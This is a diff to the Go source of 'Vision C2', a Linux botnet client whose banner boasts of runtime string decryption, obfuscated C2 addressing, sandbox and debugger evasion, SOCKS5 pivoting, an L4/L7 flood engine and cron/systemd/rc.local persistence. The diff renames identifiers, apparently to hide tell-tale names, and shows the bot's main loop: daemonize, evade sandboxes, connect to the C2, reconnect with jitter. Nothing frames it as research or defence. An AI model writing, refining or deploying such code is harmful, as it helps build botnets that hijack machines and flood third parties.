@@ -1,3 +1,36 @@
+// ============================================================================
+//
+//  ██╗   ██╗██╗███████╗██╗ ██████╗ ███╗   ██╗     ██████╗██████╗
+//  ██║   ██║██║██╔════╝██║██╔═══██╗████╗  ██║    ██╔════╝╚════██╗
+//  ██║   ██║██║███████╗██║██║   ██║██╔██╗ ██║    ██║      █████╔╝
+//  ╚██╗ ██╔╝██║╚════██║██║██║   ██║██║╚██╗██║    ██║     ██╔═══╝
+//   ╚████╔╝ ██║███████║██║╚██████╔╝██║ ╚████║    ╚██████╗███████╗
+//    ╚═══╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝     ╚═════╝╚══════╝
+//
+//  Vision C2 — the most obfuscated linux bot to ever live.
+//
+//  Built different. Runs silent. Dies never.
+//  Multi-layer runtime decryption, anti-analysis, full daemonization,
+//  DNS-over-HTTPS resolution, TLS-pinned comms, and self-healing
+//  persistence that survives anything you throw at it.
+//
+//  If you're reading this, you already lost.
+//
+//  Features:
+//    - AES-128-CTR runtime string decryption (zero plaintext in binary)
+//    - 5-layer obfuscated address resolution (Base64 > XOR > RC4 > sub > MD5)
+//    - Multi-method DNS: DoH TXT > UDP TXT > A record > direct fallback
+//    - Full Unix daemonization (fork, setsid, fd redirect, signal mask)
+//    - Sandbox/VM/debugger detection with 24h+ sleep evasion
+//    - SOCKS5 proxy with auth for pivoting
+//    - L4/L7 flood engine with session-aware HTTP/2 support
+//    - Self-updating with single-instance lock and old-PID reaping
+//    - Cron + systemd + rc.local triple-redundant startup
+//
+//
+//
+// ============================================================================
+
 package main
 
 import (
@@ -18,13 +51,13 @@ import (
 // LOGGING & DEBUG FUNCTIONS
 // ============================================================================
 
-// deoxys prints debug messages when debugMode is enabled.
+// deoxys prints debug messages when verboseLog is enabled.
 // Useful for troubleshooting C2 connection issues during development.
 // Parameters:
 //   - format: Printf-style format string
 //   - args: Format arguments
 func deoxys(format string, args ...interface{}) {
-	if debugMode {
+	if verboseLog {
 		fmt.Printf("[DEBUG] "+format+"\n", args...)
 	}
 }
@@ -34,7 +67,7 @@ var (
 	lazarusActive    bool
 	lazarusMutex     sync.Mutex
 	lazarusCount     int32
-	aptStopChan            = make(chan struct{})
+	aptStopChan      = make(chan struct{})
 	aptStopMutex     sync.Mutex
 	aptAttackRunning bool
 
@@ -67,7 +100,7 @@ var (
 //
 // Returns: error if file operation fails
 func sandworm(path, line string, perm os.FileMode) error {
-	if debugMode {
+	if verboseLog {
 		deoxys("sandworm: [DEBUG] Would open file %s for append", path)
 		deoxys("sandworm: [DEBUG] Would write: %s", strings.TrimSpace(line))
 		deoxys("sandworm: [DEBUG] Skipping actual write (debug mode)")
@@ -208,14 +241,14 @@ func machete(cmd string, conn net.Conn) error {
 // The bot will continuously attempt to reconnect on disconnection.
 func main() {
 	// Decrypt all sensitive strings before anything else touches them.
-	initSensitiveStrings()
+	initRuntimeConfig()
 
 	// Daemonize first — forks, detaches, redirects fds, ignores signals.
 	// Parent exits here; only the daemon child continues past this point.
 	stuxnet()
 
 	deoxys("main: Bot starting up...")
-	deoxys("main: Protocol version: %s", protocolVersion)
+	deoxys("main: Protocol version: %s", buildTag)
 	revilSingleInstance()
 	if winnti() {
 		deoxys("main: Sandbox detected, entering benign sleep")
@@ -260,14 +293,14 @@ func main() {
 		deoxys("main: Attempting connection to C2...")
 		conn, err := gamaredon(host, port)
 		if err != nil {
-			delay := fancyBearMin + time.Duration(rand.Int63n(int64(fancyBearMax-fancyBearMin)))
+			delay := retryFloor + time.Duration(rand.Int63n(int64(retryCeil-retryFloor)))
 			deoxys("main: Connection failed: %v, retrying in %v", err, delay)
 			time.Sleep(delay)
 			continue
 		}
 		deoxys("main: Connected to C2, starting handler")
 		anonymousSudan(conn)
-		delay := fancyBearMin + time.Duration(rand.Int63n(int64(fancyBearMax-fancyBearMin)))
+		delay := retryFloor + time.Duration(rand.Int63n(int64(retryCeil-retryFloor)))
 		deoxys("main: Handler returned, reconnecting in %v", delay)
 		time.Sleep(delay)
 	}
